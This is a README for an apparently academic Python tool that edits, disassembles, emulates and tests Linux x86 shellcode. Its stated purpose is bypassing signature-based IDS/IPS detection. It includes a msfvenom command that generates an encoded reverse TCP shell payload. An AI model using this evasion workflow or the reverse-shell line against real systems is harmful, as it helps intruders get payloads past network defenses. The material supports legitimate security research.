# Shellcode Assistant

A useful helper script for hex editing, writing and/or testing **Linux x86 shellcode** to bypass IDS/IPS.

**Shellcode Assistant is designed to be used on Kali Linux Rolling x86**

The tool was developed for a Offensive Technologies research project by students of OS3. We were looking for a comfortable and efficient way for altering existing shellcode. With this tool, the experiments of our research can easily be reproduced.

This tool is designed to make the process of altering shellcode to bypass **signature based** detection easier. It takes a raw shellcode file as input and offers various options, including dumping code in hexadecimal or Intel x86 ASM format, compiling code using a C wrapper and executing and checking a raw shellcode file for a specific string. In addition, it can emulate, analyse and generate a graph for x86 shellcode using Libemu. Automatic recompilation, which triggers when the modification time stamp changes, is another useful feature that might save time when raw shellcode is manually modified and saved using a hex editor. **We recommend using the automatic recompilation mode**.

The script also provides an **interactive command line interface**, similar to Metasploit's nasm-shell, for assembling and disassembling instructions. It does this using the Capstone and Keystone libraries.

## Requirements

Python 3 (≥ 3.5)

Capstone

Keystone

Libemu

gcc

## Setup

```
# python3 libraries
pip3 install capstone
pip3 install keystone-engine
pip3 install colorama

# gcc is required for compiling the raw shellcode into an executable
sudo apt install build-essential

# libemu is required for outputting a graph using Libemu's sctest
sudo apt install graphviz
sudo apt install libemu2
```

## Usage

```
=============================================================
                -- Shellcode Assistant v1.0 --
=============================================================

usage: shellcode_assistant.py [-h] -f FILE [-o OFFSET] [-t] [-s STDOUT]
                              [-se STDERR] [-x] [-c] [-e] [-d] [-a] [-A] [-R]
                              [-ob]

== Tool to assist a user in modifiying shellcode ==

optional arguments:
  -h, --help            show this help message and exit
  -f FILE, --file FILE  Enter path to file.
  -o OFFSET, --offset OFFSET
                        Set hexadecimal program offset.
  -t, --test            Run and test compiled executable.
  -s STDOUT, --stdout STDOUT
                        Check STDOUT for a specific string.
  -se STDERR, --stderr STDERR
                        Check STDERR for a specific string.
  -x, --hexdump         Dump hex code.
  -c, --compile         Compile file using C wrapper.
  -e, --emulate         Emulate and analyse shellcode using Libemu.
  -d, --disassemble     Disassemble shellcode.
  -a, --assembler       Start ASM interactive assembler mode.
  -A, --all             Run all functions above.
  -R, --autorecompile   Automatic recompiling and testing upon file
                        modification time change.
  -ob, --objdump        Use Linux objdump instead of Python Capstone library.
```

*The Python Capstone library might truncate code in certain cases. Use --objdump if necessary.*

## Examples

```
root@kali:~/OT-Project# python3 shellcode_assistant.py -f testing.bin -A -s "Hello World" -o 40404040
root@kali:~/OT-Project# python3 shellcode_assistant.py -f testing.bin -R
```

### ASM Interactive Assembler / Dissassembler

```
...
0x40404064    2    31 DB               xor    ebx, ebx
0x40404066    2    CD 80               int    0x8
---------------------------------------
Last Modified: Sat May 16 16:48:48 2020
---------------------------------------
asm > ?
x86-instruction | recompile | test | emulate | ls | clear | exit
asm > jmp esp; inc ecx; inc ebx
\xFF\xE4\x41\x43
asm > 0xFFE5
jmp    ebp
asm > \xFF\xE6
jmp    esi
asm > emulate

Shellcode emulated:
Diagram saved as 'testing.bin.dot' & 'testing.bin.png'
---------------------------------------
asm >
```

### Obtaining raw shellcode

#### Method 1 - Compiling ASM and Dumping Code Section to HEX

```
1. Compile ASM Code
nasm -f elf32 helloworld.asm -o helloworld.o

2. Dump object code to hex code
objdump -d ./helloworld.o|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

3. Save hex shellcode to raw shellcode file using echo
echo -e "\x31\xc0\xb0\x04\x31\xdb\xb3\x01\x31\xd2\x52\x68\x72\x6c\x64\x0a\x68\x6f\x20\x57\x6f\x68\x48\x65\x6c\x6c\x89\xe1\xb2\x0c\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80" > testing.bin
```

#### Method 2 - Using Metasploit's Shellcode Generator

```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -f raw -b "\x00" -e x86/shikata_ga_nai -o testing.bin
```

### Demo - Modifiying Shikata Ga Nai Encoded 'Hello World' Shellcode

<img title="" src="https://raw.githubusercontent.com/alexander-47u/Shellcode-Assistant/master/demo.gif" width="1000px" height="565" alt="" data-align="center">

## Authors

Alexander-OS3

Jelle-OS3

## TO-DO

Create x64 version of script

Create Windows versions of script
